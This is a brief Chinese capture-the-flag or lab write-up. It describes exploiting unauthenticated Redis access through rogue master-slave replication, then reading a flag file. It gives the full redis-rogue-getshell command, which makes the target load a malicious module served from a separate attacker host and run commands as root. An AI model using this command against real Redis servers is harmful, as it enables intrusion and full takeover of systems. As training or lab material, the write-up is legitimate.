2023年12月10日

进来没有信息先用 fscan 扫一下端口信息。

扫描结果显示存在一个 Redis 未授权访问 漏洞，我们尝试利用主从复制原理来进行 GetShell。

0x01 漏洞利用

使用 redis-rogue-getshell-master 工具进行攻击，命令如下：

python3 redis-master.py -r 39.99.239.173 -p 6379 -L 47.109.157.54 -P 8888 -f RedisModulesSDK/exp.so -c "whoami"

执行成功后，终端返回了 root 权限，证明利用成功。

0x02 获取 Flag

最后一步，直接读取目标机器上的 flag 文件：

cat /home/redis/flag/flag01

至此，渗透测试结束。
